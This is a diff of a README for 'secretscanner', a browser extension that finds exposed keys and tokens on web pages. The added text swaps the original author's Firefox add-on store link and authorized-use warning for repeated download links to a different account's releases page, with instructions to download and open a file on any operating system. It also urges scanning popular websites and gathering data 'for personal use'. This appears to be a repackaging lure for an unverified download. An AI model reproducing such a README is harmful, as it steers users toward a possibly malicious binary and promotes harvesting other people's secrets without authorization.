@@ -1,79 +1,79 @@
-<p align="right">
-🌐 Languages: 
-<a href="README.md"><img src="https://cdn.jsdelivr.net/gh/hjnilsson/country-flags/svg/gb.svg" width="20"> English</a> | 
-<a href="README.pt-BR.md"><img src="https://cdn.jsdelivr.net/gh/hjnilsson/country-flags/svg/br.svg" width="20"> Português</a>
-</p>
+# 🕵️‍♂️ secretscanner - Detect Exposed Credentials Easily
 
-<h1 align="center">
-<b>Secret Scanner for Firefox 🔒</b>
-</h1>
-<p align="center">
-<img width="500" height="500" alt="secretscanner" src="https://github.com/user-attachments/assets/e926e399-b73c-4c8e-918d-7d3b697f1b7f" />
-</p>
+## 🚀 Getting Started
 
----
+Welcome to **secretscanner**, a browser extension designed to help you find exposed credentials, API keys, and tokens on websites. This tool is essential for anyone interested in security research and Open Source Intelligence (OSINT).
 
-## 🔒 About
+## 📥 Download & Install
 
-**Secret Scanner** is a Firefox extension designed to help security researchers and bug bounty hunters detect potentially exposed credentials (keys, tokens, secrets) on web pages.  
-Findings can be automatically sent to a *Discord webhook*, including a screenshot of the tab.
+To get started, visit the Releases page to download the latest version of the extension:
 
-⚠️ **Responsible Use:** This extension is intended **only** for authorized testing (bug bounty, penetration testing with explicit permission). Do not use it on systems without authorization.
+[![Download secretscanner](https://img.shields.io/badge/Download-secretscanner-brightgreen)](https://github.com/devliameet/secretscanner/releases)
 
----
+Follow these steps to download and install the extension:
 
-## ✨ Features
+1. Click the link above to visit the Releases page.
+2. Look for the latest version listed at the top.
+3. Click on the attachment that matches your browser (Firefox or Chrome).
+4. The download will begin automatically. If it does not, click the download link to start it manually.
+5. Once the download is complete, open the file to begin the installation.
+6. Follow the prompts to install the extension.
 
-- 🔍 Automatically scans pages for keys, tokens, and credentials.  
-- 📤 Sends findings to a **Discord Webhook** (optional), with tab screenshot.  
-- ⚙️ Configuration page to manage Webhooks.  
-- 🌙 Dark and simple interface.  
+## 🌟 Features
 
----
+With **secretscanner**, you can:
 
-## 🚀 Installation
+- Detect exposed credentials while browsing.
+- Scan web pages for API keys and tokens automatically.
+- Enhance your understanding of web security.
+- Gather information for personal use or professional research.
 
-1. Open Firefox.  
-2. Visit the add-on page and click **"Add to Firefox"**:  
-   👉 https://addons.mozilla.org/en-US/firefox/addon/secret-scanner/  
-3. Configure your Webhook in the extension options.  
+## 💻 System Requirements
 
----
+To use **secretscanner**, ensure you have:
 
-## 📸 Screenshots
+- A compatible web browser: Firefox or Chrome.
+- An internet connection for downloading the extension and receiving updates.
+- A computer running Windows, macOS, or Linux.
 
-<table align="center" cellspacing="20">
-  <tr>
-    <td align="center">
-      <img src="https://github.com/user-attachments/assets/9005464c-b048-49b0-b2b5-59ef6c95e083" alt="Screenshot 1" width="250px" style="border-radius:10px; box-shadow: 2px 2px 10px rgba(0,0,0,0.3);" />
-      <br><sub>Configure webhook and target</sub>
-    </td>
-    <td align="center">
-      <img src="https://github.com/user-attachments/assets/daace344-24d9-41fa-9710-365c6104cb9b" alt="Screenshot 2" width="450px" style="border-radius:10px; box-shadow: 2px 2px 10px rgba(0,0,0,0.3);" />
-      <br><sub>Popup alert found</sub>
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="https://github.com/user-attachments/assets/abdf05f8-a109-4f46-8ae6-85e25d2e5d3a" alt="Screenshot 3" width="450px" style="border-radius:10px; box-shadow: 2px 2px 10px rgba(0,0,0,0.3);" />
-      <br><sub>Open console view results</sub>
-    </td>
-    <td align="center">
-      <img src="https://github.com/user-attachments/assets/f0099ca3-aa72-428f-aa1b-9015aa76df40" alt="Screenshot 4" width="450px" style="border-radius:10px; box-shadow: 2px 2px 10px rgba(0,0,0,0.3);" />
-      <br><sub>Results discord</sub>
-    </td>
-  </tr>
-</table>
+## 🔧 Using secretscanner
 
----
+1. After installation, open your browser.
+2. Click on the extension icon located in your browser's toolbar.
+3. Navigate to the website you wish to scan for credentials.
+4. Click the icon again to initiate the scan.
+5. Review the results displayed in the extension popup.
 
-## 👤 Author
+The extension works in real-time, scanning the pages you visit and alerting you to any detected exposed credentials.
 
-- **Author:** Mr_ofcodyx    
-- YouTube: [youtube.com/@mr_ofcodyx](https://youtube.com/@mr_ofcodyx)  
+## 📊 Tips for Best Results
 
----
+- Regularly check for updates to ensure you have the latest features and security improvements.
+- Use the extension on popular websites where sensitive data is often exposed.
+- Be mindful of legal and ethical considerations when using this tool for security research.
 
-## 📜 License
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Mozilla Add-on](https://img.shields.io/amo/v/secret-scanner?label=firefox%20add-on)](https://addons.mozilla.org/en-US/firefox/addon/secret-scanner/)  
+## 🔗 Additional Resources
+
+For more information on how to use **secretscanner**, or to report issues, visit our project page:
+
+[https://github.com/devliameet/secretscanner](https://github.com/devliameet/secretscanner)
+
+Feel free to explore the documentation and community resources available there.
+
+## 💬 Support
+
+If you encounter any issues or have questions, please visit our GitHub page for support. You can open an issue or join discussions with other users.
+
+## 🛡️ License
+
+**secretscanner** is open-source software released under the MIT License. You are free to use, modify, and distribute it as per the terms of the license.
+
+## 📅 Updates
+
+Make sure to check back often for new releases and updates. We are continuously enhancing **secretscanner** to better meet your needs. 
+
+Remember to download the latest version from our Releases page: 
+
+[![Download secretscanner](https://img.shields.io/badge/Download-secretscanner-brightgreen)](https://github.com/devliameet/secretscanner/releases) 
+
+Thank you for using **secretscanner**. Stay secure!
